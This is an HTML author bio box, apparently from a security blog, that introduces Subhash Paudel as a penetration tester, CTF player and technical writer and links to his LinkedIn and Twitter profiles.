<p><strong>Author: </strong>Subhash Paudel is a Penetration Tester and a CTF player who has a keen interest in various technologies and loves to explore more and more. Additionally, he is a technical writer at Hacking articles. Contact here<strong>: <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://au.linkedin.com/in/subhash-paudel-a021ab207">Linkedin</a> </span></strong>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://twitter.com/subhashpaudel94">Twitter</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
